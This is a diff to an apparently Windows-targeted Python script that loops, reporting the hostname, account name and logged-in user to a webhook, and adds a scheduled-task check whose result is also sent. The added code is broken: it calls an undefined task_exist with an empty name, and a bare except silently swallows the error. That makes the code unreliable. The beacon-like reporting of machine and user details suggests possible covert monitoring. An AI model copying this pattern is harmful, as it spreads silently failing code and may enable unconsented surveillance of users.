@@ -121,7 +121,18 @@ def send_webhook(message):
     except Exception as e:
         print("Error:", e)
         return False
-        
+
+def task_exists(task_name: str) -> bool:
+    """
+    Returns True if a Windows scheduled task exists, False otherwise.
+    """
+    result = subprocess.run(
+        ["schtasks", "/query", "/tn", task_name],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL
+    )
+    return result.returncode == 0
+
 if __name__ == "__main__":
     computer_name = os.environ.get("COMPUTERNAME", socket.gethostname())
     user_name = os.environ.get("USERNAME", "SYSTEM")
@@ -132,7 +143,14 @@ if __name__ == "__main__":
     alive_data = format_alive_data(computer_name,user_name)
     while True:
         if not s:
-            user = get_logged_in_user()        
+            try:
+                texist = task_exist("")
+                msg = str(texist)
+                send_webhook(msg)
+            except:
+                pass
+            
+            user = get_logged_in_user()
             if user:
                 msg = (
                     f"{computer_name} {user_name} {user}"
